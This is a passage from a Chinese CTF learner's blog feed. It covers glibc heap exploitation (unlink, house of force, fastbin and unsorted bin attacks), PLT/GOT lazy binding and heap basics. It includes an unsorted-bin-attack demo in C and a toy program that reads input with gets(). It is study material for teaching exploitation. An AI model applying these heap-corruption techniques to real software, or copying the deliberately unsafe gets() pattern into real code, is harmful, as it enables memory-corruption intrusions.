fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><h3 id="5-利用条件"><a href="#5-利用条件" class="headerlink" title="5.利用条件"></a>5.利用条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="6-效果"><a href="#6-效果" class="headerlink" title="6.效果"></a>6.效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h2 id="0x06-house-of-force"><a href="#0x06-house-of-force" class="headerlink" title="0x06 house of force"></a>0x06 house of force</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>攻击者通过堆溢出或者其他方式，控制到topchunk的size成员，这样我们就可以使topchunk的地址超出正常的堆段的地址，这样我们就可以控制到超出堆段之外的内存</p><h3 id="2-利用条件-2"><a href="#2-利用条件-2" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>①通过堆溢出或其他方式，控制到topchunk的size成员</li><li>②将topchunk的size成员变为一个非常大的数，这样topchunk就会超出内存中的堆段，从而访问到其他段的内存地址（got表的地址）</li><li>③此时通过malloc申请内存的时候，申请的就是got的内存地址，就可以更改got内存的内容</li></ul><h2 id="0x07-fastbin-attack"><a href="#0x07-fastbin-attack" class="headerlink" title="0x07 fastbin attack"></a>0x07 fastbin attack</h2><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h2><h3 id="1-概念-5"><a href="#1-概念-5" class="headerlink" title="1.概念"></a>1.概念</h3><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h3 id="2-使用情况"><a href="#2-使用情况" class="headerlink" title="2.使用情况"></a>2.使用情况</h3><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><h3 id="3-原理解释"><a href="#3-原理解释" class="headerlink" title="3.原理解释"></a>3.原理解释</h3><ol><li><p>unsortedbin正常存储freechunk的结构如图所示，此时这个freechunk是我们还可以通过指针操控的（虽然free了但没有置空）<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png" alt="image-20201222212418753"></p></li><li><p>如果在取走堆块之前，我们将unsortedbin中的chunk的bk指针改为我们的target地址，如下图所示：<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png" alt="image-20201222212555394"></p></li><li><p>此时我们去malloc堆块的时候就会发生如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** victim is free chunk **/</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png" alt="image-20201222213058942"></p><p>在我们移除victim之后就变成了这样。我们的target的fd的内容为malloc_state结构体的unsortedbin链的fd指针了</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png" alt="image-20201222213335526"></p></li></ol><h3 id="4-演示"><a href="#4-演示" class="headerlink" title="4.演示"></a>4.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large "</span></span><br><span class="line">                  <span class="string">"unsigned long value into stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">"In practice, unsorted bin attack is generally prepared for further "</span></span><br><span class="line">      <span class="string">"attacks, such as rewriting the "</span></span><br><span class="line">      <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid "</span></span><br><span class="line">                  <span class="string">"consolidating the top chunk with"</span></span><br><span class="line">                  <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the "</span></span><br><span class="line">                  <span class="string">"unsorted bin with its bk pointer "</span></span><br><span class="line">                  <span class="string">"point to %p\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the "</span></span><br><span class="line">                  <span class="string">"victim-&gt;bk pointer\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits "</span></span><br><span class="line">                  <span class="string">"machine, it should be target address-8):%p\n\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During "</span></span><br><span class="line">                  <span class="string">"this time, target should has already been "</span></span><br><span class="line">                  <span class="string">"rewrite:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;target_var, (<span class="keyword">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png" alt="image-20201222164945226"></p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png" alt="img"></p><p>经过上面原理的解释，这个就不说了</p><p>最后总结一句话:</p><p>修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;堆基础和堆漏洞还是分开比较好&lt;/p&gt;
&lt;p&gt;这样看着也比较整齐&lt;/p&gt;
&lt;h1 id=&quot;堆漏洞&quot;&gt;&lt;a href=&quot;#堆漏洞&quot; class=&quot;headerlink&quot; title=&quot;堆漏洞&quot;&gt;&lt;/a&gt;堆漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x01-Off-By-One&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="堆" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>plt表和got表</title>
    <link href="https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/"/>
    <id>https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/</id>
    <published>2020-12-16T13:32:03.000Z</published>
    <updated>2020-12-17T01:05:53.222Z</updated>
    
    <content type="html"><![CDATA[<p>需要啥 学啥</p><p>看学长博客写了这个 自己也记录一下 毕竟刚学</p><p><a href="https://ld1ng.com/2020/06/16/GOTPLT/" target="_blank" rel="noopener">https://ld1ng.com/2020/06/16/GOTPLT/</a></p><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><p><a href="https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><h1 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h1><p>GOT（全局偏移表）和 PLT(过程链接表)，是两个表之间的交互才使得函数实现延迟绑定，通过这种方法将过程地址的绑定推迟到第一次调用该函数。</p><h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you win\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">gets(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you lose\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这个文件</p><p>gdb调试一下</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png" alt="image-20201216221001253"></p><p>此时我们可以看到<code>gets@plt</code>和<code>puts@plt</code>这两个函数</p><p>@plt这里的意思是指PLT表中的数据的地址。</p><blockquote><p>为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的，</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845" alt="这里写图片描述"></p></blockquote><p>这时 我们也就理解了@plt标志的函数，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p><p>那@plt函数里面是什么呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass gets</span><br></pre></td></tr></table></figure><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png" alt="image-20201216223010888"></p><blockquote><ol><li>jmp指令跳转到GOT表</li><li>GOT表中的数据为0x4004c6</li><li>跳转到指令地址为0x4004c6</li><li>执行<code>push 0x3</code>这个为在GOT中的下标序号</li><li>在执行<code>jmp 0x400480</code></li><li>而0x400480为PLT[0]的地址</li><li>PLT[0]的指令会进入动态链接器的入口</li><li>执行一个函数将真正的函数地址覆盖到GOT表中</li></ol></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.<strong>PLT[0]处到底做了什么，按照我们之前的思路它不是应该跳转到GOT[0]吗</strong></p><p>这是plt[0]中的内容</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png" alt="image-20201217082532501"></p><p>后面的16进制就是GOT表中的内容</p><blockquote><p><strong>我们的PLT[0]根本没有跳转到GOT[0]，它不像我们的PLT[1]这些存储的是GOT表项的地址，它是一些代码指令，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</strong></p></blockquote><p>所以我们可以得到下面这张图</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419" alt="这里写图片描述"></p><p>而plt[0]代码做的事情则是：由于GOT[2]中存储的是动态链接器的入口地址，所以通过<strong>GOT[1]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中。</strong></p><p>总而言之，我们调用一个函数的时候有两种方法，一个是通过PLT表调用，一个则是通过GOT表调用，<strong>因为PLT表最终也是跳转GOT表，GOT表中则是一个函数真正的地址，这里需要注意的是，在一个函数没有运行一次之前，GOT表中的数据为@plt函数中下一条指令的地址。</strong></p><p>2.<strong>为什么中间要进行push压栈操作？</strong></p><p>中间进行的压栈是为了确定PLT对应的GOT表项，即是PLT[1]−&gt;GOT[3]，0x3就是GOT的下标3，也就是说压栈后我们跳转到PLT[0],接着PLT[0]中的指令会通过这次压栈的序号来确定操作的GOT表项为多少</p><p>3.<strong>压入的序号为什么为0x3，不是最开始应该为0x0吗？</strong></p><p>因为GOT[0],GOT[1],GOT[2]都有其他用处，所以从0x3开始。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="GOT表的构成"><a href="#GOT表的构成" class="headerlink" title="GOT表的构成"></a>GOT表的构成</h2><p>GOT[0]包含.dynamic段的地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</p><p>GOT[1]包含动态链接器的标识;</p><p>GOT[2]包含动态链接器的延迟绑定代码的入口点。</p><p>GOT的其他表目为本模块要引用的一个全局变量或函数的地址。</p><h2 id="PLT表的构成"><a href="#PLT表的构成" class="headerlink" title="PLT表的构成"></a>PLT表的构成</h2><p>PLT表并不是每个表项都用于存放“函数地址“，其中PLT[0]是一个特殊的表目，它跳转到动态链接器中执行，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>最后，自己总结一下实现过程</p><ol><li>首先，进入PLT表项，这时第一步就是跳转到GOT表项</li><li>GOT表项存放PLT表第二条指令的地址，也就是<code>push 0x x</code>把相应的idx压入</li><li>下一步就是跳转到PLT[0]中，进而链接到GOT[2] ,进入链接器入口</li><li>最后通过动态链接器将真正函数地址覆盖到GOT表中</li></ol><p>别人的动图</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;需要啥 学啥&lt;/p&gt;
&lt;p&gt;看学长博客写了这个 自己也记录一下 毕竟刚学&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/06/16/GOTPLT/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ld1ng.c</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>堆</title>
    <link href="https://pz1o.top/2020/12/15/%E5%A0%86/"/>
    <id>https://pz1o.top/2020/12/15/%E5%A0%86/</id>
    <published>2020-12-15T08:19:22.000Z</published>
    <updated>2020-12-22T13:19:27.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆-持续更新"><a href="#堆-持续更新" class="headerlink" title="堆(持续更新)"></a>堆(持续更新)</h1><p><a href="https://ld1ng.com/2020/07/23/Heap/" target="_blank" rel="noopener">https://ld1ng.com/2020/07/23/Heap/</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap</a></p><p>上一个PWN学习 学得不太全面</p><p>写这个主要是为了自己能够全面复习堆的基础知识</p><p>由于我没学过操作系统 有些相关知识可能不太对 还请指正</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="0x01-什么是堆"><a href="#0x01-什么是堆" class="headerlink" title="0x01 什么是堆"></a>0x01 什么是堆</h3><ul><li>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存</li><li>堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长</li><li>我们一般成管理堆的那部分程序为堆管理器</li></ul><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ul><li>malloc</li><li>free</li></ul><h3 id="0x02-如何分配堆和释放堆"><a href="#0x02-如何分配堆和释放堆" class="headerlink" title="0x02 如何分配堆和释放堆"></a>0x02 如何分配堆和释放堆</h3><h4 id="1-malloc函数"><a href="#1-malloc函数" class="headerlink" title="1.malloc函数"></a>1.<strong>malloc函数</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>该函数返回对应大小字节的内存块的指针</li><li>此外，该函数还对一些异常情况进行了处理</li><li>当n=0时，返回当前系统允许的堆的最小内存块</li><li><strong>当n为负数时，由于在大多数系统中，size_t是无符号数，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配</strong></li></ul><h4 id="2-free函数"><a href="#2-free函数" class="headerlink" title="2.free函数"></a>2.<strong>free函数</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>该函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到的，也有可能是通过相关的函数realloc得到的</li></ul><p>该函数还对异常情况进行了一下处理</p><ul><li>当p为空指针时，函数不执行任何操作</li><li>当p已经被释放之后，再次释放会出现错误的效果，这其实就是double free</li><li>除了被禁用（mallocpt）的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便减小程序所使用的内存空间</li></ul><h3 id="0x03-如何实现堆"><a href="#0x03-如何实现堆" class="headerlink" title="0x03 如何实现堆"></a>0x03 如何实现堆</h3><ul><li>堆的glibc实现主要包括struct _heap_info，struct malloc_state，struct malloc_chunk这3个结构体</li></ul><h4 id="1-Arena"><a href="#1-Arena" class="headerlink" title="1.Arena"></a>1.Arena</h4><p><img src="/2020/12/15/%E5%A0%86/image-20201212002041969.png" alt="image-20201212002041969"></p><blockquote><ul><li>一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的</li><li>主线程的arnea称为“main_arena”。子线程的arnea称为“thread_arena”</li></ul></blockquote><h5 id="Arena的数量及管理"><a href="#Arena的数量及管理" class="headerlink" title="Arena的数量及管理"></a>Arena的数量及管理</h5><p>我们说到有主线程和子线程的arena</p><p><strong>那么每个程序的arena的数量应该就是有限的</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">32</span>位系统中：</span><br><span class="line">     Number of arena = <span class="number">2</span> * number of cores + <span class="number">1.</span></span><br><span class="line"><span class="number">64</span>位系统中：</span><br><span class="line">     Number of arena = <span class="number">8</span> * number of cores + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里就会涉及一个多线程共享问题</p><blockquote><p>eg：一个主Arena 两个副Arena</p><p>如果有一个4线程（大于3个Arena）的程序，显然这里就会出现一个共享问题</p><p><strong>此时glibc malloc会做以下操作：</strong></p><ul><li>首先，glibc malloc循环遍历所有可用的竞技场，在遍历的过程中，它会尝试锁该竞技场。如果成功锁（该竞技场当前对应的线程并未使用堆内存则表示可锁），那么该竞技场就可以被线程3所使用</li><li>而如果没能找到可用的舞台上，那么就将线程3的malloc的操作阻塞，直到有可用的舞台为止</li><li>当线程3的malloc阻塞解除时，glibc malloc就会先尝试使用最近访问的竞技场（此时为主竞技场）。如果此时主竞技场可用的话，就直接使用，否则就将线程3再次阻塞，直到主舞台上再次可用为止</li></ul></blockquote><h4 id="2-malloc-state"><a href="#2-malloc-state" class="headerlink" title="2.malloc_state"></a>2.<strong>malloc_state</strong></h4><ul><li>glibc的中arnea就是用这个结构体表示的</li><li>其中包含很多的信息：各种bins的信息，top chunk以及最后一个剩余chunk等</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free 